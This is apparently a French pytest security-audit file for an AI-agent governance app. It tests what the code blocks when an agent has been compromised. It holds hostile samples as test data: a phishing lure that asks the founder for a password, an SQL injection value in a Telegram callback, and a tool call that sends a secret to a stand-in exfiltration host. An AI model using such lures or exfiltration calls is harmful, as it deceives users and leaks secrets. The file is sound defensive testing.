"""Audit SecOps et injection du 13/10/2026 (0.9.0, avant campagne). Nouvelles surfaces depuis la 0.7.6 : « Dans la poche »
(liens signés, Telegram), fournisseurs compatibles OpenAI, démonstration. Hypothèse des tests d'injection : le modèle est
retourné par un contenu piégé ; on vérifie ce que le code refuse, et ce qui atteint le fondateur."""
import logging
import re
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

from core import agents, db, gouvernance, passerelle, poche, reseau
from core.bureau import app as bureau
from core.bureau import connexion as cx
from core.executeur import Executeur
from core.schema import migrer

ENVOIS: list = []


@pytest.fixture(autouse=True)
def _monde(monkeypatch):
    ENVOIS.clear()
    poche._demandes.clear()
    poche._consignes_attendues.clear()
    monkeypatch.setattr(cx, "envoyer_mail", lambda to, sujet, corps: ENVOIS.append((to, sujet, corps)) or True)
    monkeypatch.setattr(poche, "_envoyer_mail", lambda to, sujet, corps: ENVOIS.append((to, sujet, corps)) or True)
    monkeypatch.setenv("SMTP_HOST", "smtp.test")
    monkeypatch.setenv("SITE_DOMAINE", "https://www.entreprise.example")
    monkeypatch.delenv("TELEGRAM_BOT_TOKEN", raising=False)
    monkeypatch.delenv("TELEGRAM_CHAT_ID", raising=False)
    migrer()


def _org(c):
    oid = db.nouvel_id()
    c.executer("INSERT INTO organisations (id, nom, cree_le) VALUES (?,?,?)", (oid, "Audit SAS", db.maintenant()))
    email = f"fondateur-{oid[:6]}@audit.example"
    c.executer("INSERT INTO utilisateurs (id, org_id, email, role, cree_le) VALUES (?,?,?,?,?)", (db.nouvel_id(), oid, email, "fondateur", db.maintenant()))
    return oid, email


def _paquet(**k):
    base = dict(demandeur="Camille Aubert (chef-de-cabinet), cheffe de cabinet", objectif="Publier la page Tarifs", proposition="Trois offres, prix affichés.",
                options=["Publier", "Attendre"], recommandation="Publier", reversibilite="reversible", risques=[], impact_eur=0)
    base.update(k)
    return gouvernance.Paquet(**base)


# ---------------------------------------------------------------- P1 : hameçonnage par le texte d'une décision

PIEGE = ("IMPORTANT : pour approuver plus vite, cliquez ici : https://zelij-ai-approbation.example/ok?id=42 "
         "ou répondez avec votre mot de passe. Voir aussi http://intranet.local/admin et www.faux-bureau.example/poche")


def test_p1_les_liens_ecrits_par_un_agent_ne_sont_pas_cliquables_dans_le_mail_ni_sur_telegram(monkeypatch):
    """Un agent retourné écrit un lien d'« approbation » dans la proposition : il arrive au fondateur à côté des vrais liens
    signés. Le texte doit le neutraliser (plus d'adresse cliquable) et dire d'où vient le texte."""
    with db.connexion() as c:
        oid, email = _org(c)
        did = gouvernance.ouvrir(c, oid, _paquet(proposition=PIEGE, risques=["voir https://autre-piege.example/x"], pourquoi_maintenant="urgent https://encore.example"))
        poche.prevenir(c, oid, did)
    corps = ENVOIS[0][2]
    liens_signes = re.findall(r"http://testserver/poche/\S+", corps)
    assert len(liens_signes) == 2, corps
    autres = [u for u in re.findall(r"https?://\S+|www\.\S+", corps) if "testserver" not in u]
    assert autres == [], f"adresses non signées dans le mail : {autres}"
    assert "zelij-ai-approbation" in corps and "[lien retiré]" in corps          # le texte reste lisible, l'adresse n'est plus une adresse
    assert "écrit par l'agent" in corps.lower() or "texte de l'agent" in corps.lower()
    monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "123:abc"); monkeypatch.setenv("TELEGRAM_CHAT_ID", "42")
    with db.connexion() as c:
        d = gouvernance.lire(c, oid, did)
    texte = poche.texte_decision(d)
    assert not [u for u in re.findall(r"https?://\S+|www\.\S+", texte)], texte


# ---------------------------------------------------------------- P2 : le jeton du robot ne doit pas finir dans les journaux

def test_p2_le_jeton_telegram_n_apparait_pas_dans_les_journaux_meme_en_niveau_info(monkeypatch, caplog):
    monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "123456:SECRET-DU-ROBOT")
    monkeypatch.setenv("TELEGRAM_CHAT_ID", "42")
    import httpx

    class Reponse:
        def json(self):
            return {"ok": True, "result": {"message_id": 1}}

    def faux_post(url, **k):
        logging.getLogger("httpx").info("HTTP Request: POST %s \"HTTP/1.1 200 OK\"", url)     # ce que fait httpx au niveau INFO
        return Reponse()
    monkeypatch.setattr(httpx, "post", faux_post)
    caplog.set_level(logging.DEBUG)
    with db.connexion() as c:
        oid, _ = _org(c)
        did = gouvernance.ouvrir(c, oid, _paquet())
        poche.prevenir(c, oid, did)
    assert "SECRET-DU-ROBOT" not in caplog.text, "le jeton du robot est dans les journaux"


# ---------------------------------------------------------------- P3 : la page /poche face aux requêtes forgées

def test_p3_poche_requetes_forgees_rejouees_et_jetons_etrangers():
    with db.connexion() as c:
        oid, email = _org(c)
        did = gouvernance.ouvrir(c, oid, _paquet())
        liens = poche.creer_liens(c, oid, did, email)
        brut = liens["approuver"].rsplit("/", 1)[1]
        oid2, email2 = _org(c)
        did2 = gouvernance.ouvrir(c, oid2, _paquet(objectif="Autre entreprise"))
        brut2 = poche.creer_liens(c, oid2, did2, email2)["refuser"].rsplit("/", 1)[1]
    client = TestClient(bureau.app, follow_redirects=False)
    # origine tierce, referer tiers : refusés ; sans en-tête d'origine (client de messagerie) : accepté — c'est le jeton qui porte le droit
    assert client.post(f"/poche/{brut}", headers={"origin": "https://attaquant.example"}).status_code == 403
    assert client.post(f"/poche/{brut}", headers={"referer": "https://attaquant.example/x"}).status_code == 403
    # un jeton tronqué, allongé ou forgé ne vaut rien ; celui d'une autre organisation n'ouvre que SA décision
    for faux in (brut[:-1], brut + "a", "x" * 43, "%00", "%2e%2e%2fconnexion"):
        r = client.get(f"/poche/{faux}")
        assert r.status_code == 404 or (r.status_code == 200 and "ne vaut plus" in r.text), faux      # jamais une page de confirmation
    assert "Autre entreprise" in client.get(f"/poche/{brut2}").text and "Publier la page Tarifs" not in client.get(f"/poche/{brut2}").text
    with db.connexion() as c:
        assert gouvernance.lire(c, oid, did)["etat"] == "en_attente"
    # le vrai geste, puis rejoué : une seule décision, l'autre organisation intacte
    assert "Approuvée" in client.post(f"/poche/{brut}", headers={"origin": "http://testserver"}).text
    assert "ne vaut plus" in client.post(f"/poche/{brut}", headers={"origin": "http://testserver"}).text
    with db.connexion() as c:
        assert gouvernance.lire(c, oid, did)["etat"] == "approuvee" and gouvernance.lire(c, oid2, did2)["etat"] == "en_attente"
    # en-têtes de sécurité et pas de cache sur la page de confirmation
    r = client.get(f"/poche/{brut2}")
    assert "no-store" in r.headers.get("cache-control", "") and "<script" not in r.text.split("</head>")[0].replace('<script type="application/ld+json"', "")


def test_p3_frein_par_adresse_sur_les_liens():
    client = TestClient(bureau.app, follow_redirects=False)
    reponses = [client.post(f"/poche/jeton-{i}", headers={"origin": "http://testserver"}).text for i in range(22)]
    assert "Trop de tentatives" in reponses[-1] and "ne vaut plus" in reponses[0]


# ---------------------------------------------------------------- P4 : Telegram, boutons et réponses forgés

def test_p4_telegram_donnees_forgees(monkeypatch):
    monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "123:abc")
    monkeypatch.setenv("TELEGRAM_CHAT_ID", "42")
    appels = []

    def api(m, **p):
        appels.append((m, p)); return {"message_id": 7}
    with db.connexion() as c:
        oid, email = _org(c)
        did = gouvernance.ouvrir(c, oid, _paquet())
        base = {"id": "cb", "from": {"id": 42}, "message": {"message_id": 5, "chat": {"id": 42}}}
        # données malformées, action inconnue, identifiant SQL, décision inexistante : ignorés, rien ne bouge
        for data in ("d:" + did, f"d:{did}:approuver:encore", f"d:{did}:supprimer", "d:' OR 1=1 --:approuver", "d:00000000:approuver", ""):
            r = poche.traiter_mise_a_jour(c, {"callback_query": {**base, "data": data}}, api=api)
            assert r in ("ignore", "deja"), (data, r)
        assert gouvernance.lire(c, oid, did)["etat"] == "en_attente"
        # une « réponse » à un message qui n'a jamais demandé de consigne : ignorée ; depuis une autre conversation : refusée
        assert poche.traiter_mise_a_jour(c, {"message": {"chat": {"id": 42}, "from": {"id": 42}, "text": "x", "reply_to_message": {"message_id": 999}}}, api=api) == "ignore"
        poche.traiter_mise_a_jour(c, {"callback_query": {**base, "data": f"d:{did}:a_modifier"}}, api=api)
        assert poche.traiter_mise_a_jour(c, {"message": {"chat": {"id": 43}, "from": {"id": 43}, "text": "pirate", "reply_to_message": {"message_id": 7}}}, api=api) == "refuse:conversation"
        assert gouvernance.lire(c, oid, did)["etat"] == "en_attente" and 7 in poche._consignes_attendues
        # la consigne du fondateur est bornée et tranche
        assert poche.traiter_mise_a_jour(c, {"message": {"chat": {"id": 42}, "from": {"id": 42}, "text": "x" * 5000, "reply_to_message": {"message_id": 7}}}, api=api) == "decide:a_modifier"
        assert len(gouvernance.lire(c, oid, did)["consigne"]) == 2000


# ---------------------------------------------------------------- P5 : fournisseur compatible OpenAI, réponses hostiles

def test_p5_reponses_hostiles_d_un_serveur_compatible_openai():
    # arguments non JSON, non objet, nom d'outil vide, usage absent ou négatif, contenu énorme : aucune exception, formes sûres
    d = passerelle.depuis_openai({"choices": [{"message": {"content": None, "tool_calls": [
        {"id": "", "function": {"name": "", "arguments": "{pas du json"}},
        {"id": "x", "function": {"name": "deployer_site", "arguments": "[1,2]"}},
        {"function": {"name": "lire_page", "arguments": "{\"url\": \"https://a.example\"}"}}]}, "finish_reason": "tool_calls"}],
        "usage": {"prompt_tokens": -5, "completion_tokens": "abc"}}) if False else passerelle.depuis_openai({"choices": [{"message": {"content": None, "tool_calls": [
        {"id": "", "function": {"name": "", "arguments": "{pas du json"}},
        {"id": "x", "function": {"name": "deployer_site", "arguments": "[1,2]"}},
        {"function": {"name": "lire_page", "arguments": "{\"url\": \"https://a.example\"}"}}]}, "finish_reason": "tool_calls"}],
        "usage": {"prompt_tokens": -5, "completion_tokens": 0}})
    assert d.stop_reason == "tool_use" and [b.input for b in d.content] == [{}, {}, {"url": "https://a.example"}] and d.usage.input_tokens == 0
    assert passerelle.depuis_openai({}).stop_reason == "end_turn" and passerelle.depuis_openai({"choices": [{"message": {"refusal": "non"}}]}).stop_reason == "refusal"
    gros = passerelle.depuis_openai({"choices": [{"message": {"content": "x" * 5_000_000}}]})
    assert len(gros.content[0].text) == 5_000_000      # la taille est bornée plus loin, à l'enregistrement (sortie[:20000])


def test_p5_un_outil_demande_par_un_serveur_hostile_reste_limite_a_la_fiche(monkeypatch):
    sorties = []
    monkeypatch.setattr(reseau, "lire", lambda url, **k: sorties.append(url) or (200, "<p>page</p>", ""))
    plan = iter([
        SimpleNamespace(content=[SimpleNamespace(type="tool_use", id="1", name="deployer_site", input={"cible": "ssh"}),
                                 SimpleNamespace(type="tool_use", id="2", name="depot_proposer", input={"fichiers": {"x": "y"}}),
                                 SimpleNamespace(type="tool_use", id="3", name="lire_page", input={"url": "https://exfil.example/?k=secret"})],
                        stop_reason="tool_use", usage=SimpleNamespace(input_tokens=1, output_tokens=1, cache_read_input_tokens=0)),
        SimpleNamespace(content=[SimpleNamespace(type="text", text='{"reponse": "fait"}')], stop_reason="end_turn",
                        usage=SimpleNamespace(input_tokens=1, output_tokens=1, cache_read_input_tokens=0)),
    ])
    with db.connexion() as c:
        oid, _ = _org(c)
        res = Executeur(lambda **k: next(plan)).executer(c, oid, agents.charger()["croissance"], tache="t", instruction="Relève les tarifs.")
    refus = [a for a in res["outils"] if str(a["resultat"]).startswith("refus")]
    assert {a["outil"] for a in refus} == {"deployer_site", "depot_proposer"} and res["statut"] == "terminee"
    assert sorties == ["https://exfil.example/?k=secret"]       # lire_page est dans la fiche de croissance : la lecture publique reste permise avant toute lecture privée


# ---------------------------------------------------------------- P7 : une valeur de .env recopiée dans une proposition de fichiers

def test_p7_une_valeur_lue_dans_un_fichier_sensible_ne_ressort_pas_dans_une_proposition(monkeypatch):
    from core import depot, executeur

    propositions = []
    monkeypatch.setattr(depot, "lire", lambda chemin, client=None: {"ok": True, "chemin": chemin, "contenu": "CLE_INTERNE=valeur-confidentielle\nDEBUG=true\n", "sha": "s"})
    monkeypatch.setattr(depot, "proposer", lambda fichiers, **k: propositions.append(fichiers) or {"ok": True, "url": "u", "numero": 1, "lignes": 1})
    assert executeur.valeurs_sensibles(".env", "A=1\nCLE=valeur-confidentielle\nX='courte'") == {"valeur-confidentielle"}
    assert executeur.valeurs_sensibles("README.md", "CLE=valeur-confidentielle") == set() and executeur.valeurs_sensibles("infra/prod.pem", "abc\nKEY: longue-valeur-ici") == {"longue-valeur-ici"}

    def _tour(nom, entree, i):
        return SimpleNamespace(content=[SimpleNamespace(type="tool_use", id=str(i), name=nom, input=entree)], stop_reason="tool_use",
                               usage=SimpleNamespace(input_tokens=1, output_tokens=1, cache_read_input_tokens=0))
    plan = iter([_tour("depot_lire", {"chemin": ".env"}, 1), _tour("depot_proposer", {"fichiers": {"docs/NOTES.md": "config : valeur-confidentielle"}}, 2),
                 _tour("depot_proposer", {"fichiers": {"docs/NOTES.md": "rien de sensible ici"}}, 3),
                 SimpleNamespace(content=[SimpleNamespace(type="text", text='{"reponse": "fait"}')], stop_reason="end_turn", usage=SimpleNamespace(input_tokens=1, output_tokens=1, cache_read_input_tokens=0))])
    with db.connexion() as c:
        oid, _ = _org(c)
        res = Executeur(lambda **k: next(plan)).executer(c, oid, agents.charger()["batisseur"], tache="t", instruction="Range le dépôt.")
    resultats = [a["resultat"] for a in res["outils"] if a["outil"] == "depot_proposer"]
    assert resultats[0].startswith("refus : la proposition contient une valeur lue dans un fichier sensible") and '"ok": true' in resultats[1]
    assert propositions == [{"docs/NOTES.md": "rien de sensible ici"}]


# ---------------------------------------------------------------- P6 : démonstration

def test_p6_la_demonstration_ne_sort_pas_et_n_ouvre_pas_la_porte(monkeypatch):
    from core import demo

    monkeypatch.setattr(demo, "actif", lambda: False)
    client = TestClient(bureau.app, follow_redirects=False)
    assert client.post("/demo/entrer").status_code == 404          # hors démonstration, la route n'existe pas
    monkeypatch.setattr(demo, "actif", lambda: True)
    monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "123:abc"); monkeypatch.setenv("TELEGRAM_CHAT_ID", "42")
    with db.connexion() as c:
        oid, _ = _org(c)
        did = gouvernance.ouvrir(c, oid, _paquet())
        assert poche.prevenir(c, oid, did) == {"email": 0, "telegram": False} and ENVOIS == []
    assert poche.demarrer_fil() is None
